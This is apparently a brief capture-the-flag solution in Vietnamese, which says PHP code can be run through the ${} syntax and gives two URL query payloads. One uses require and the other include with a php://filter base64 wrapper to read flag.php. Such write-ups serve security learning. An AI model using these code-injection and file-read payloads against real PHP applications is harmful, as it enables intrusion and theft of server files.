# Solution

Ta có thể thực thi php code với syntax `${}`

Payload:

`?q=${require%09$_GET[0]}${flag}&0=flag.php`

hoặc

`?q={${include$_GET[a]}}&a=php://filter/read=convert.base64-encode/resource=/flag.php`